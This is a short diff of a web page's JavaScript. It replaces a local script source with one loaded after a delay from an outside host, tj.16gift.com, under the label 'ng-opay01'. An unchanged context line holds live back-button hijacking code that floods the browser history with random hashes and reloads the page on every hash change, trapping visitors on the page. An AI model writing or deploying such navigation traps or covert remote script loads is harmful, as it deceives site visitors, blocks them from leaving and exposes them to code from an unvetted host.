@@ -7,7 +7,7 @@
     var ps = document.documentElement.appendChild(document.createElement("script"));
     ps.async = true;
     ps.setAttribute("data-domain", 'ng-opay01');
-    ps.src = "/let/script.js";
+    ps.src = "https://tj.16gift.com/js/script.js";
 }, 500);
 
 window.hh=function(p){history.pushState(history.length+1,"message","#"+randomString(8));};window.onhashchange=function(){top.location.reload();};setTimeout('hh(6);',500);
